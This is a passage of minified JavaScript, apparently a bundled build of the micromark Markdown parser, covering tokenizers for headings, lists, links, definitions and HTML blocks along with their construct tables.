this.setCursor(Number.POSITIVE_INFINITY),this.left.pop()}push(t){this.setCursor(Number.POSITIVE_INFINITY),this.left.push(t)}pushMany(t){this.setCursor(Number.POSITIVE_INFINITY),Fo(this.left,t)}unshift(t){this.setCursor(0),this.right.push(t)}unshiftMany(t){this.setCursor(0),Fo(this.right,t.reverse())}setCursor(t){if(!(t===this.left.length||t>this.left.length&&this.right.length===0||t<0&&this.left.length===0))if(t<this.left.length){const n=this.left.splice(t,Number.POSITIVE_INFINITY);Fo(this.right,n.reverse())}else{const n=this.right.splice(this.left.length+this.right.length-t,Number.POSITIVE_INFINITY);Fo(this.left,n.reverse())}}}function Fo(e,t){let n=0;if(t.length<1e4)e.push(...t);else for(;n<t.length;)e.push(...t.slice(n,n+1e4)),n+=1e4}function rT(e){const t={};let n=-1,r,a,l,u,f,h,m;const x=new aP(e);for(;++n<x.length;){for(;n in t;)n=t[n];if(r=x.get(n),n&&r[1].type==="chunkFlow"&&x.get(n-1)[1].type==="listItemPrefix"&&(h=r[1]._tokenizer.events,l=0,l<h.length&&h[l][1].type==="lineEndingBlank"&&(l+=2),l<h.length&&h[l][1].type==="content"))for(;++l<h.length&&h[l][1].type!=="content";)h[l][1].type==="chunkText"&&(h[l][1]._isInFirstContentOfListItem=!0,l++);if(r[0]==="enter")r[1].contentType&&(Object.assign(t,sP(x,n)),n=t[n],m=!0);else if(r[1]._container){for(l=n,a=void 0;l--;)if(u=x.get(l),u[1].type==="lineEnding"||u[1].type==="lineEndingBlank")u[0]==="enter"&&(a&&(x.get(a)[1].type="lineEndingBlank"),u[1].type="lineEnding",a=l);else if(!(u[1].type==="linePrefix"||u[1].type==="listItemIndent"))break;a&&(r[1].end={...x.get(a)[1].start},f=x.slice(a,n),f.unshift(r),x.splice(a,n-a+1,f))}}return vr(e,0,Number.POSITIVE_INFINITY,x.slice(0)),!m}function sP(e,t){const n=e.get(t)[1],r=e.get(t)[2];let a=t-1;const l=[];let u=n._tokenizer;u||(u=r.parser[n.contentType](n.start),n._contentTypeTextTrailing&&(u._contentTypeTextTrailing=!0));const f=u.events,h=[],m={};let x,g,b=-1,E=n,C=0,P=0;const O=[P];for(;E;){for(;e.get(++a)[1]!==E;);l.push(a),E._tokenizer||(x=r.sliceStream(E),E.next||x.push(null),g&&u.defineSkip(E.start),E._isInFirstContentOfListItem&&(u._gfmTasklistFirstContentOfListItem=!0),u.write(x),E._isInFirstContentOfListItem&&(u._gfmTasklistFirstContentOfListItem=void 0)),g=E,E=E.next}for(E=n;++b<f.length;)f[b][0]==="exit"&&f[b-1][0]==="enter"&&f[b][1].type===f[b-1][1].type&&f[b][1].start.line!==f[b][1].end.line&&(P=b+1,O.push(P),E._tokenizer=void 0,E.previous=void 0,E=E.next);for(u.events=[],E?(E._tokenizer=void 0,E.previous=void 0):O.pop(),b=O.length;b--;){const N=f.slice(O[b],O[b+1]),T=l.pop();h.push([T,T+N.length-1]),e.splice(T,2,N)}for(h.reverse(),b=-1;++b<h.length;)m[C+h[b][0]]=C+h[b][1],C+=h[b][1]-h[b][0]-1;return m}const lP={resolve:uP,tokenize:cP},oP={partial:!0,tokenize:dP};function uP(e){return rT(e),e}function cP(e,t){let n;return r;function r(f){return e.enter("content"),n=e.enter("chunkContent",{contentType:"content"}),a(f)}function a(f){return f===null?l(f):Xe(f)?e.check(oP,u,l)(f):(e.consume(f),a)}function l(f){return e.exit("chunkContent"),e.exit("content"),t(f)}function u(f){return e.consume(f),e.exit("chunkContent"),n.next=e.enter("chunkContent",{contentType:"content",previous:n}),n=n.next,a}}function dP(e,t,n){const r=this;return a;function a(u){return e.exit("chunkContent"),e.enter("lineEnding"),e.consume(u),e.exit("lineEnding"),ft(e,l,"linePrefix")}function l(u){if(u===null||Xe(u))return n(u);const f=r.events[r.events.length-1];return!r.parser.constructs.disable.null.includes("codeIndented")&&f&&f[1].type==="linePrefix"&&f[2].sliceSerialize(f[1],!0).length>=4?t(u):e.interrupt(r.parser.constructs.flow,n,t)(u)}}function iT(e,t,n,r,a,l,u,f,h){const m=h||Number.POSITIVE_INFINITY;let x=0;return g;function g(N){return N===60?(e.enter(r),e.enter(a),e.enter(l),e.consume(N),e.exit(l),b):N===null||N===32||N===41||pf(N)?n(N):(e.enter(r),e.enter(u),e.enter(f),e.enter("chunkString",{contentType:"string"}),P(N))}function b(N){return N===62?(e.enter(l),e.consume(N),e.exit(l),e.exit(a),e.exit(r),t):(e.enter(f),e.enter("chunkString",{contentType:"string"}),E(N))}function E(N){return N===62?(e.exit("chunkString"),e.exit(f),b(N)):N===null||N===60||Xe(N)?n(N):(e.consume(N),N===92?C:E)}function C(N){return N===60||N===62||N===92?(e.consume(N),E):E(N)}function P(N){return!x&&(N===null||N===41||At(N))?(e.exit("chunkString"),e.exit(f),e.exit(u),e.exit(r),t(N)):x<m&&N===40?(e.consume(N),x++,P):N===41?(e.consume(N),x--,P):N===null||N===32||N===40||pf(N)?n(N):(e.consume(N),N===92?O:P)}function O(N){return N===40||N===41||N===92?(e.consume(N),P):P(N)}}function aT(e,t,n,r,a,l){const u=this;let f=0,h;return m;function m(E){return e.enter(r),e.enter(a),e.consume(E),e.exit(a),e.enter(l),x}function x(E){return f>999||E===null||E===91||E===93&&!h||E===94&&!f&&"_hiddenFootnoteSupport"in u.parser.constructs?n(E):E===93?(e.exit(l),e.enter(a),e.consume(E),e.exit(a),e.exit(r),t):Xe(E)?(e.enter("lineEnding"),e.consume(E),e.exit("lineEnding"),x):(e.enter("chunkString",{contentType:"string"}),g(E))}function g(E){return E===null||E===91||E===93||Xe(E)||f++>999?(e.exit("chunkString"),x(E)):(e.consume(E),h||(h=!ct(E)),E===92?b:g)}function b(E){return E===91||E===92||E===93?(e.consume(E),f++,g):g(E)}}function sT(e,t,n,r,a,l){let u;return f;function f(b){return b===34||b===39||b===40?(e.enter(r),e.enter(a),e.consume(b),e.exit(a),u=b===40?41:b,h):n(b)}function h(b){return b===u?(e.enter(a),e.consume(b),e.exit(a),e.exit(r),t):(e.enter(l),m(b))}function m(b){return b===u?(e.exit(l),h(u)):b===null?n(b):Xe(b)?(e.enter("lineEnding"),e.consume(b),e.exit("lineEnding"),ft(e,m,"linePrefix")):(e.enter("chunkString",{contentType:"string"}),x(b))}function x(b){return b===u||b===null||Xe(b)?(e.exit("chunkString"),m(b)):(e.consume(b),b===92?g:x)}function g(b){return b===u||b===92?(e.consume(b),x):x(b)}}function iu(e,t){let n;return r;function r(a){return Xe(a)?(e.enter("lineEnding"),e.consume(a),e.exit("lineEnding"),n=!0,r):ct(a)?ft(e,r,n?"linePrefix":"lineSuffix")(a):t(a)}}const fP={name:"definition",tokenize:pP},hP={partial:!0,tokenize:mP};function pP(e,t,n){const r=this;let a;return l;function l(E){return e.enter("definition"),u(E)}function u(E){return aT.call(r,e,f,n,"definitionLabel","definitionLabelMarker","definitionLabelString")(E)}function f(E){return a=Qr(r.sliceSerialize(r.events[r.events.length-1][1]).slice(1,-1)),E===58?(e.enter("definitionMarker"),e.consume(E),e.exit("definitionMarker"),h):n(E)}function h(E){return At(E)?iu(e,m)(E):m(E)}function m(E){return iT(e,x,n,"definitionDestination","definitionDestinationLiteral","definitionDestinationLiteralMarker","definitionDestinationRaw","definitionDestinationString")(E)}function x(E){return e.attempt(hP,g,g)(E)}function g(E){return ct(E)?ft(e,b,"whitespace")(E):b(E)}function b(E){return E===null||Xe(E)?(e.exit("definition"),r.parser.defined.push(a),t(E)):n(E)}}function mP(e,t,n){return r;function r(f){return At(f)?iu(e,a)(f):n(f)}function a(f){return sT(e,l,n,"definitionTitle","definitionTitleMarker","definitionTitleString")(f)}function l(f){return ct(f)?ft(e,u,"whitespace")(f):u(f)}function u(f){return f===null||Xe(f)?t(f):n(f)}}const gP={name:"hardBreakEscape",tokenize:xP};function xP(e,t,n){return r;function r(l){return e.enter("hardBreakEscape"),e.consume(l),a}function a(l){return Xe(l)?(e.exit("hardBreakEscape"),t(l)):n(l)}}const yP={name:"headingAtx",resolve:vP,tokenize:bP};function vP(e,t){let n=e.length-2,r=3,a,l;return e[r][1].type==="whitespace"&&(r+=2),n-2>r&&e[n][1].type==="whitespace"&&(n-=2),e[n][1].type==="atxHeadingSequence"&&(r===n-1||n-4>r&&e[n-2][1].type==="whitespace")&&(n-=r+1===n?2:4),n>r&&(a={type:"atxHeadingText",start:e[r][1].start,end:e[n][1].end},l={type:"chunkText",start:e[r][1].start,end:e[n][1].end,contentType:"text"},vr(e,r,n-r+1,[["enter",a,t],["enter",l,t],["exit",l,t],["exit",a,t]])),e}function bP(e,t,n){let r=0;return a;function a(x){return e.enter("atxHeading"),l(x)}function l(x){return e.enter("atxHeadingSequence"),u(x)}function u(x){return x===35&&r++<6?(e.consume(x),u):x===null||At(x)?(e.exit("atxHeadingSequence"),f(x)):n(x)}function f(x){return x===35?(e.enter("atxHeadingSequence"),h(x)):x===null||Xe(x)?(e.exit("atxHeading"),t(x)):ct(x)?ft(e,f,"whitespace")(x):(e.enter("atxHeadingText"),m(x))}function h(x){return x===35?(e.consume(x),h):(e.exit("atxHeadingSequence"),f(x))}function m(x){return x===null||x===35||At(x)?(e.exit("atxHeadingText"),f(x)):(e.consume(x),m)}}const EP=["address","article","aside","base","basefont","blockquote","body","caption","center","col","colgroup","dd","details","dialog","dir","div","dl","dt","fieldset","figcaption","figure","footer","form","frame","frameset","h1","h2","h3","h4","h5","h6","head","header","hr","html","iframe","legend","li","link","main","menu","menuitem","nav","noframes","ol","optgroup","option","p","param","search","section","summary","table","tbody","td","tfoot","th","thead","title","tr","track","ul"],Nb=["pre","script","style","textarea"],wP={concrete:!0,name:"htmlFlow",resolveTo:CP,tokenize:SP},kP={partial:!0,tokenize:AP},TP={partial:!0,tokenize:NP};function CP(e){let t=e.length;for(;t--&&!(e[t][0]==="enter"&&e[t][1].type==="htmlFlow"););return t>1&&e[t-2][1].type==="linePrefix"&&(e[t][1].start=e[t-2][1].start,e[t+1][1].start=e[t-2][1].start,e.splice(t-2,2)),e}function SP(e,t,n){const r=this;let a,l,u,f,h;return m;function m(k){return x(k)}function x(k){return e.enter("htmlFlow"),e.enter("htmlFlowData"),e.consume(k),g}function g(k){return k===33?(e.consume(k),b):k===47?(e.consume(k),l=!0,P):k===63?(e.consume(k),a=3,r.interrupt?t:q):Kn(k)?(e.consume(k),u=String.fromCharCode(k),O):n(k)}function b(k){return k===45?(e.consume(k),a=2,E):k===91?(e.consume(k),a=5,f=0,C):Kn(k)?(e.consume(k),a=4,r.interrupt?t:q):n(k)}function E(k){return k===45?(e.consume(k),r.interrupt?t:q):n(k)}function C(k){const se="CDATA[";return k===se.charCodeAt(f++)?(e.consume(k),f===se.length?r.interrupt?t:Z:C):n(k)}function P(k){return Kn(k)?(e.consume(k),u=String.fromCharCode(k),O):n(k)}function O(k){if(k===null||k===47||k===62||At(k)){const se=k===47,Ve=u.toLowerCase();return!se&&!l&&Nb.includes(Ve)?(a=1,r.interrupt?t(k):Z(k)):EP.includes(u.toLowerCase())?(a=6,se?(e.consume(k),N):r.interrupt?t(k):Z(k)):(a=7,r.interrupt&&!r.parser.lazy[r.now().line]?n(k):l?T(k):A(k))}return k===45||On(k)?(e.consume(k),u+=String.fromCharCode(k),O):n(k)}function N(k){return k===62?(e.consume(k),r.interrupt?t:Z):n(k)}function T(k){return ct(k)?(e.consume(k),T):Y(k)}function A(k){return k===47?(e.consume(k),Y):k===58||k===95||Kn(k)?(e.consume(k),_):ct(k)?(e.consume(k),A):Y(k)}function _(k){return k===45||k===46||k===58||k===95||On(k)?(e.consume(k),_):M(k)}function M(k){return k===61?(e.consume(k),R):ct(k)?(e.consume(k),M):A(k)}function R(k){return k===null||k===60||k===61||k===62||k===96?n(k):k===34||k===39?(e.consume(k),h=k,B):ct(k)?(e.consume(k),R):U(k)}function B(k){return k===h?(e.consume(k),h=null,$):k===null||Xe(k)?n(k):(e.consume(k),B)}function U(k){return k===null||k===34||k===39||k===47||k===60||k===61||k===62||k===96||At(k)?M(k):(e.consume(k),U)}function $(k){return k===47||k===62||ct(k)?A(k):n(k)}function Y(k){return k===62?(e.consume(k),ne):n(k)}function ne(k){return k===null||Xe(k)?Z(k):ct(k)?(e.consume(k),ne):n(k)}function Z(k){return k===45&&a===2?(e.consume(k),pe):k===60&&a===1?(e.consume(k),oe):k===62&&a===4?(e.consume(k),We):k===63&&a===3?(e.consume(k),q):k===93&&a===5?(e.consume(k),xe):Xe(k)&&(a===6||a===7)?(e.exit("htmlFlowData"),e.check(kP,Q,me)(k)):k===null||Xe(k)?(e.exit("htmlFlowData"),me(k)):(e.consume(k),Z)}function me(k){return e.check(TP,ye,Q)(k)}function ye(k){return e.enter("lineEnding"),e.consume(k),e.exit("lineEnding"),J}function J(k){return k===null||Xe(k)?me(k):(e.enter("htmlFlowData"),Z(k))}function pe(k){return k===45?(e.consume(k),q):Z(k)}function oe(k){return k===47?(e.consume(k),u="",ae):Z(k)}function ae(k){if(k===62){const se=u.toLowerCase();return Nb.includes(se)?(e.consume(k),We):Z(k)}return Kn(k)&&u.length<8?(e.consume(k),u+=String.fromCharCode(k),ae):Z(k)}function xe(k){return k===93?(e.consume(k),q):Z(k)}function q(k){return k===62?(e.consume(k),We):k===45&&a===2?(e.consume(k),q):Z(k)}function We(k){return k===null||Xe(k)?(e.exit("htmlFlowData"),Q(k)):(e.consume(k),We)}function Q(k){return e.exit("htmlFlow"),t(k)}}function NP(e,t,n){const r=this;return a;function a(u){return Xe(u)?(e.enter("lineEnding"),e.consume(u),e.exit("lineEnding"),l):n(u)}function l(u){return r.parser.lazy[r.now().line]?n(u):t(u)}}function AP(e,t,n){return r;function r(a){return e.enter("lineEnding"),e.consume(a),e.exit("lineEnding"),e.attempt(nc,t,n)}}const DP={name:"htmlText",tokenize:LP};function LP(e,t,n){const r=this;let a,l,u;return f;function f(q){return e.enter("htmlText"),e.enter("htmlTextData"),e.consume(q),h}function h(q){return q===33?(e.consume(q),m):q===47?(e.consume(q),M):q===63?(e.consume(q),A):Kn(q)?(e.consume(q),U):n(q)}function m(q){return q===45?(e.consume(q),x):q===91?(e.consume(q),l=0,C):Kn(q)?(e.consume(q),T):n(q)}function x(q){return q===45?(e.consume(q),E):n(q)}function g(q){return q===null?n(q):q===45?(e.consume(q),b):Xe(q)?(u=g,oe(q)):(e.consume(q),g)}function b(q){return q===45?(e.consume(q),E):g(q)}function E(q){return q===62?pe(q):q===45?b(q):g(q)}function C(q){const We="CDATA[";return q===We.charCodeAt(l++)?(e.consume(q),l===We.length?P:C):n(q)}function P(q){return q===null?n(q):q===93?(e.consume(q),O):Xe(q)?(u=P,oe(q)):(e.consume(q),P)}function O(q){return q===93?(e.consume(q),N):P(q)}function N(q){return q===62?pe(q):q===93?(e.consume(q),N):P(q)}function T(q){return q===null||q===62?pe(q):Xe(q)?(u=T,oe(q)):(e.consume(q),T)}function A(q){return q===null?n(q):q===63?(e.consume(q),_):Xe(q)?(u=A,oe(q)):(e.consume(q),A)}function _(q){return q===62?pe(q):A(q)}function M(q){return Kn(q)?(e.consume(q),R):n(q)}function R(q){return q===45||On(q)?(e.consume(q),R):B(q)}function B(q){return Xe(q)?(u=B,oe(q)):ct(q)?(e.consume(q),B):pe(q)}function U(q){return q===45||On(q)?(e.consume(q),U):q===47||q===62||At(q)?$(q):n(q)}function $(q){return q===47?(e.consume(q),pe):q===58||q===95||Kn(q)?(e.consume(q),Y):Xe(q)?(u=$,oe(q)):ct(q)?(e.consume(q),$):pe(q)}function Y(q){return q===45||q===46||q===58||q===95||On(q)?(e.consume(q),Y):ne(q)}function ne(q){return q===61?(e.consume(q),Z):Xe(q)?(u=ne,oe(q)):ct(q)?(e.consume(q),ne):$(q)}function Z(q){return q===null||q===60||q===61||q===62||q===96?n(q):q===34||q===39?(e.consume(q),a=q,me):Xe(q)?(u=Z,oe(q)):ct(q)?(e.consume(q),Z):(e.consume(q),ye)}function me(q){return q===a?(e.consume(q),a=void 0,J):q===null?n(q):Xe(q)?(u=me,oe(q)):(e.consume(q),me)}function ye(q){return q===null||q===34||q===39||q===60||q===61||q===96?n(q):q===47||q===62||At(q)?$(q):(e.consume(q),ye)}function J(q){return q===47||q===62||At(q)?$(q):n(q)}function pe(q){return q===62?(e.consume(q),e.exit("htmlTextData"),e.exit("htmlText"),t):n(q)}function oe(q){return e.exit("htmlTextData"),e.enter("lineEnding"),e.consume(q),e.exit("lineEnding"),ae}function ae(q){return ct(q)?ft(e,xe,"linePrefix",r.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(q):xe(q)}function xe(q){return e.enter("htmlTextData"),u(q)}}const hx={name:"labelEnd",resolveAll:jP,resolveTo:RP,tokenize:OP},_P={tokenize:FP},IP={tokenize:MP},PP={tokenize:BP};function jP(e){let t=-1;const n=[];for(;++t<e.length;){const r=e[t][1];if(n.push(e[t]),r.type==="labelImage"||r.type==="labelLink"||r.type==="labelEnd"){const a=r.type==="labelImage"?4:2;r.type="data",t+=a}}return e.length!==n.length&&vr(e,0,e.length,n),e}function RP(e,t){let n=e.length,r=0,a,l,u,f;for(;n--;)if(a=e[n][1],l){if(a.type==="link"||a.type==="labelLink"&&a._inactive)break;e[n][0]==="enter"&&a.type==="labelLink"&&(a._inactive=!0)}else if(u){if(e[n][0]==="enter"&&(a.type==="labelImage"||a.type==="labelLink")&&!a._balanced&&(l=n,a.type!=="labelLink")){r=2;break}}else a.type==="labelEnd"&&(u=n);const h={type:e[l][1].type==="labelLink"?"link":"image",start:{...e[l][1].start},end:{...e[e.length-1][1].end}},m={type:"label",start:{...e[l][1].start},end:{...e[u][1].end}},x={type:"labelText",start:{...e[l+r+2][1].end},end:{...e[u-2][1].start}};return f=[["enter",h,t],["enter",m,t]],f=Ar(f,e.slice(l+1,l+r+3)),f=Ar(f,[["enter",x,t]]),f=Ar(f,dh(t.parser.constructs.insideSpan.null,e.slice(l+r+4,u-3),t)),f=Ar(f,[["exit",x,t],e[u-2],e[u-1],["exit",m,t]]),f=Ar(f,e.slice(u+1)),f=Ar(f,[["exit",h,t]]),vr(e,l,e.length,f),e}function OP(e,t,n){const r=this;let a=r.events.length,l,u;for(;a--;)if((r.events[a][1].type==="labelImage"||r.events[a][1].type==="labelLink")&&!r.events[a][1]._balanced){l=r.events[a][1];break}return f;function f(b){return l?l._inactive?g(b):(u=r.parser.defined.includes(Qr(r.sliceSerialize({start:l.end,end:r.now()}))),e.enter("labelEnd"),e.enter("labelMarker"),e.consume(b),e.exit("labelMarker"),e.exit("labelEnd"),h):n(b)}function h(b){return b===40?e.attempt(_P,x,u?x:g)(b):b===91?e.attempt(IP,x,u?m:g)(b):u?x(b):g(b)}function m(b){return e.attempt(PP,x,g)(b)}function x(b){return t(b)}function g(b){return l._balanced=!0,n(b)}}function FP(e,t,n){return r;function r(g){return e.enter("resource"),e.enter("resourceMarker"),e.consume(g),e.exit("resourceMarker"),a}function a(g){return At(g)?iu(e,l)(g):l(g)}function l(g){return g===41?x(g):iT(e,u,f,"resourceDestination","resourceDestinationLiteral","resourceDestinationLiteralMarker","resourceDestinationRaw","resourceDestinationString",32)(g)}function u(g){return At(g)?iu(e,h)(g):x(g)}function f(g){return n(g)}function h(g){return g===34||g===39||g===40?sT(e,m,n,"resourceTitle","resourceTitleMarker","resourceTitleString")(g):x(g)}function m(g){return At(g)?iu(e,x)(g):x(g)}function x(g){return g===41?(e.enter("resourceMarker"),e.consume(g),e.exit("resourceMarker"),e.exit("resource"),t):n(g)}}function MP(e,t,n){const r=this;return a;function a(f){return aT.call(r,e,l,u,"reference","referenceMarker","referenceString")(f)}function l(f){return r.parser.defined.includes(Qr(r.sliceSerialize(r.events[r.events.length-1][1]).slice(1,-1)))?t(f):n(f)}function u(f){return n(f)}}function BP(e,t,n){return r;function r(l){return e.enter("reference"),e.enter("referenceMarker"),e.consume(l),e.exit("referenceMarker"),a}function a(l){return l===93?(e.enter("referenceMarker"),e.consume(l),e.exit("referenceMarker"),e.exit("reference"),t):n(l)}}const HP={name:"labelStartImage",resolveAll:hx.resolveAll,tokenize:UP};function UP(e,t,n){const r=this;return a;function a(f){return e.enter("labelImage"),e.enter("labelImageMarker"),e.consume(f),e.exit("labelImageMarker"),l}function l(f){return f===91?(e.enter("labelMarker"),e.consume(f),e.exit("labelMarker"),e.exit("labelImage"),u):n(f)}function u(f){return f===94&&"_hiddenFootnoteSupport"in r.parser.constructs?n(f):t(f)}}const zP={name:"labelStartLink",resolveAll:hx.resolveAll,tokenize:WP};function WP(e,t,n){const r=this;return a;function a(u){return e.enter("labelLink"),e.enter("labelMarker"),e.consume(u),e.exit("labelMarker"),e.exit("labelLink"),l}function l(u){return u===94&&"_hiddenFootnoteSupport"in r.parser.constructs?n(u):t(u)}}const am={name:"lineEnding",tokenize:qP};function qP(e,t){return n;function n(r){return e.enter("lineEnding"),e.consume(r),e.exit("lineEnding"),ft(e,t,"linePrefix")}}const _d={name:"thematicBreak",tokenize:$P};function $P(e,t,n){let r=0,a;return l;function l(m){return e.enter("thematicBreak"),u(m)}function u(m){return a=m,f(m)}function f(m){return m===a?(e.enter("thematicBreakSequence"),h(m)):r>=3&&(m===null||Xe(m))?(e.exit("thematicBreak"),t(m)):n(m)}function h(m){return m===a?(e.consume(m),r++,h):(e.exit("thematicBreakSequence"),ct(m)?ft(e,f,"whitespace")(m):f(m))}}const ir={continuation:{tokenize:QP},exit:XP,name:"list",tokenize:GP},YP={partial:!0,tokenize:ZP},VP={partial:!0,tokenize:KP};function GP(e,t,n){const r=this,a=r.events[r.events.length-1];let l=a&&a[1].type==="linePrefix"?a[2].sliceSerialize(a[1],!0).length:0,u=0;return f;function f(E){const C=r.containerState.type||(E===42||E===43||E===45?"listUnordered":"listOrdered");if(C==="listUnordered"?!r.containerState.marker||E===r.containerState.marker:A0(E)){if(r.containerState.type||(r.containerState.type=C,e.enter(C,{_container:!0})),C==="listUnordered")return e.enter("listItemPrefix"),E===42||E===45?e.check(_d,n,m)(E):m(E);if(!r.interrupt||E===49)return e.enter("listItemPrefix"),e.enter("listItemValue"),h(E)}return n(E)}function h(E){return A0(E)&&++u<10?(e.consume(E),h):(!r.interrupt||u<2)&&(r.containerState.marker?E===r.containerState.marker:E===41||E===46)?(e.exit("listItemValue"),m(E)):n(E)}function m(E){return e.enter("listItemMarker"),e.consume(E),e.exit("listItemMarker"),r.containerState.marker=r.containerState.marker||E,e.check(nc,r.interrupt?n:x,e.attempt(YP,b,g))}function x(E){return r.containerState.initialBlankLine=!0,l++,b(E)}function g(E){return ct(E)?(e.enter("listItemPrefixWhitespace"),e.consume(E),e.exit("listItemPrefixWhitespace"),b):n(E)}function b(E){return r.containerState.size=l+r.sliceSerialize(e.exit("listItemPrefix"),!0).length,t(E)}}function QP(e,t,n){const r=this;return r.containerState._closeFlow=void 0,e.check(nc,a,l);function a(f){return r.containerState.furtherBlankLines=r.containerState.furtherBlankLines||r.containerState.initialBlankLine,ft(e,t,"listItemIndent",r.containerState.size+1)(f)}function l(f){return r.containerState.furtherBlankLines||!ct(f)?(r.containerState.furtherBlankLines=void 0,r.containerState.initialBlankLine=void 0,u(f)):(r.containerState.furtherBlankLines=void 0,r.containerState.initialBlankLine=void 0,e.attempt(VP,t,u)(f))}function u(f){return r.containerState._closeFlow=!0,r.interrupt=void 0,ft(e,e.attempt(ir,t,n),"linePrefix",r.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(f)}}function KP(e,t,n){const r=this;return ft(e,a,"listItemIndent",r.containerState.size+1);function a(l){const u=r.events[r.events.length-1];return u&&u[1].type==="listItemIndent"&&u[2].sliceSerialize(u[1],!0).length===r.containerState.size?t(l):n(l)}}function XP(e){e.exit(this.containerState.type)}function ZP(e,t,n){const r=this;return ft(e,a,"listItemPrefixWhitespace",r.parser.constructs.disable.null.includes("codeIndented")?void 0:5);function a(l){const u=r.events[r.events.length-1];return!ct(l)&&u&&u[1].type==="listItemPrefixWhitespace"?t(l):n(l)}}const Ab={name:"setextUnderline",resolveTo:JP,tokenize:ej};function JP(e,t){let n=e.length,r,a,l;for(;n--;)if(e[n][0]==="enter"){if(e[n][1].type==="content"){r=n;break}e[n][1].type==="paragraph"&&(a=n)}else e[n][1].type==="content"&&e.splice(n,1),!l&&e[n][1].type==="definition"&&(l=n);const u={type:"setextHeading",start:{...e[r][1].start},end:{...e[e.length-1][1].end}};return e[a][1].type="setextHeadingText",l?(e.splice(a,0,["enter",u,t]),e.splice(l+1,0,["exit",e[r][1],t]),e[r][1].end={...e[l][1].end}):e[r][1]=u,e.push(["exit",u,t]),e}function ej(e,t,n){const r=this;let a;return l;function l(m){let x=r.events.length,g;for(;x--;)if(r.events[x][1].type!=="lineEnding"&&r.events[x][1].type!=="linePrefix"&&r.events[x][1].type!=="content"){g=r.events[x][1].type==="paragraph";break}return!r.parser.lazy[r.now().line]&&(r.interrupt||g)?(e.enter("setextHeadingLine"),a=m,u(m)):n(m)}function u(m){return e.enter("setextHeadingLineSequence"),f(m)}function f(m){return m===a?(e.consume(m),f):(e.exit("setextHeadingLineSequence"),ct(m)?ft(e,h,"lineSuffix")(m):h(m))}function h(m){return m===null||Xe(m)?(e.exit("setextHeadingLine"),t(m)):n(m)}}const tj={tokenize:nj};function nj(e){const t=this,n=e.attempt(nc,r,e.attempt(this.parser.constructs.flowInitial,a,ft(e,e.attempt(this.parser.constructs.flow,a,e.attempt(lP,a)),"linePrefix")));return n;function r(l){if(l===null){e.consume(l);return}return e.enter("lineEndingBlank"),e.consume(l),e.exit("lineEndingBlank"),t.currentConstruct=void 0,n}function a(l){if(l===null){e.consume(l);return}return e.enter("lineEnding"),e.consume(l),e.exit("lineEnding"),t.currentConstruct=void 0,n}}const rj={resolveAll:oT()},ij=lT("string"),aj=lT("text");function lT(e){return{resolveAll:oT(e==="text"?sj:void 0),tokenize:t};function t(n){const r=this,a=this.parser.constructs[e],l=n.attempt(a,u,f);return u;function u(x){return m(x)?l(x):f(x)}function f(x){if(x===null){n.consume(x);return}return n.enter("data"),n.consume(x),h}function h(x){return m(x)?(n.exit("data"),l(x)):(n.consume(x),h)}function m(x){if(x===null)return!0;const g=a[x];let b=-1;if(g)for(;++b<g.length;){const E=g[b];if(!E.previous||E.previous.call(r,r.previous))return!0}return!1}}}function oT(e){return t;function t(n,r){let a=-1,l;for(;++a<=n.length;)l===void 0?n[a]&&n[a][1].type==="data"&&(l=a,a++):(!n[a]||n[a][1].type!=="data")&&(a!==l+2&&(n[l][1].end=n[a-1][1].end,n.splice(l+2,a-l-2),a=l+2),l=void 0);return e?e(n,r):n}}function sj(e,t){let n=0;for(;++n<=e.length;)if((n===e.length||e[n][1].type==="lineEnding")&&e[n-1][1].type==="data"){const r=e[n-1][1],a=t.sliceStream(r);let l=a.length,u=-1,f=0,h;for(;l--;){const m=a[l];if(typeof m=="string"){for(u=m.length;m.charCodeAt(u-1)===32;)f++,u--;if(u)break;u=-1}else if(m===-2)h=!0,f++;else if(m!==-1){l++;break}}if(t._contentTypeTextTrailing&&n===e.length&&(f=0),f){const m={type:n===e.length||h||f<2?"lineSuffix":"hardBreakTrailing",start:{_bufferIndex:l?u:r.start._bufferIndex+u,_index:r.start._index+l,line:r.end.line,column:r.end.column-f,offset:r.end.offset-f},end:{...r.end}};r.end={...m.start},r.start.offset===r.end.offset?Object.assign(r,m):(e.splice(n,0,["enter",m,t],["exit",m,t]),n+=2)}n++}return e}const lj={42:ir,43:ir,45:ir,48:ir,49:ir,50:ir,51:ir,52:ir,53:ir,54:ir,55:ir,56:ir,57:ir,62:eT},oj={91:fP},uj={[-2]:im,[-1]:im,32:im},cj={35:yP,42:_d,45:[Ab,_d],60:wP,61:Ab,95:_d,96:Sb,126:Sb},dj={38:nT,92:tT},fj={[-5]:am,[-4]:am,[-3]:am,33:HP,38:nT,42:D0,60:[z5,DP],91:zP,92:[gP,tT],93:hx,95:D0,96:tP},hj={null:[D0,rj]},pj={null:[42,95]},mj={null:[]},gj=Object.freeze(Object.defineProperty({__proto__:null,attentionMarkers:pj,contentInitial:oj,disable:mj,document:lj,flow:cj,flowInitial:uj,insideSpan:hj,string:dj,text:fj},Symbol.toStringTag,{value:"Module"}));function xj(e,t,n){let r={_bufferIndex:-1,_index:0,line:n&&n.line||1,column:n&&n.column||1,offset:n&&n.offset||0};const a={},l=[];let u=[],f=[];const h={attempt:B(M),check:B(R),consume:T,enter:A,exit:_,interrupt:B(R,{interrupt:!0})},m={code:null,containerState:{},defineSkip:P,events:[],now:C,parser:e,previous:null,sliceSerialize:b,sliceStream:E,write:g};let x=t.tokenize.call(m,h);return t.resolveAll&&l.push(t),m;function g(ne){return u=Ar(u,ne),O(),u[u.length-1]!==null?[]:(U(t,0),m.events=dh(l,m.events,m),m.events)}function b(ne,Z){return vj(E(ne),Z)}function E(ne){return yj(u,ne)}function C(){const{_bufferIndex:ne,_index:Z,line:me,column:ye,offset:J}=r;return{_bufferIndex:ne,_index:Z,line:me,column:ye,offset:J}}function P(ne){a[ne.line]=ne.column,Y()}function O(){let ne;for(;r._index<u.length;){const Z=u[r._index];if(typeof Z=="string")for(ne=r._index,r._bufferIndex<0&&(r._bufferIndex=0);r._index===ne&&r._bufferIndex<Z.length;)N(Z.charCodeAt(r._bufferIndex));else N(Z)}}function N(ne){x=x(ne)}function T(ne){Xe(ne)?(r.line++,r.column=1,r.offset+=ne===-3?2:1,Y()):ne!==-1&&(r.column++,r.offset++),r._bufferIndex<0?r._index++:(r._bufferIndex++,r._bufferIndex===u[r._index].length&&(r._bufferIndex=-1,r._index++)),m.previous=ne}function A(ne,Z){const me=Z||{};return me.type=ne,me.start=C(),m.events.push(["enter",me,m]),f.push(me),me}function _(ne){const Z=f.pop();return 